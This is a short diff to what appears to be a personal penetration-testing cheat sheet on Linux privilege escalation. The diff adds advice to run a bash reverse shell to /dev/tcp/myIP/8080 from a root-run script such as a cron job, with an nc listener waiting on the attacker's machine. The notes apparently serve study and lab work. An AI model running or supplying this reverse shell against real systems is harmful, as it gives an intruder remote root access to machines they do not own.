@@ -122,7 +122,12 @@ Linux Priv Esc
   
   PrivEsc - Capabilites
   - getcap -r / 2>/dev/null
-
+  
+  
+  If you can get a script to run as root (maybe through crontab) then you can execute the following:
+  bash -i >& /dev/tcp/myIP/8080 0>&1
+  
+  Setup an NC listener on the "myIP" device.
   
   
   Windows Priv Esc
